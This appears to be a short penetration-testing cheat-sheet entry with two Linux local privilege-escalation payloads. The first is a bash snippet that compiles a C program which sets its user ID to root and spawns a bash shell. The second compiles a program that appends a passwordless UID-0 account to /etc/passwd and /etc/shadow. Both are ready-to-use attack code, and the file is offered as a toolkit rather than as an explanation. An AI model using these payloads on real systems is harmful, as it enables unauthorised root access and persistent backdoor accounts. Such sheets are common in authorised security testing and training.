# C
% c, shell

## generate shell bash bin
#plateform/linux #target/local  #cat/CODE/SAMPLE #cat/ATTACK/GENERATE_PAYLOAD 

```bash
echo 'int main(void){setreuid(0,0); system("/bin/bash"); return 0;}' > pwn.c;
gcc pwn.c -o <filename|shell>;
rm pwn.c
```

## add root user
#plateform/linux #target/local  #cat/CODE/SAMPLE #cat/ATTACK/GENERATE_PAYLOAD 

```bash
echo -e '#include <stdio.h>\n#include <stdlib.h>\nint main() {\nsystem("echo '<anyuser>:x:0:0:root:/root:/bin/bash' >> /etc/passwd");\nsystem("echo '<anyuser>::18133:0:99999:7:::' >> /etc/shadow");\nprintf("User added.");\nreturn 0;\n}' > <anyuser>.c
gcc <anyuser>.c -o <filename|shell>
rm <anyuser>.c
```
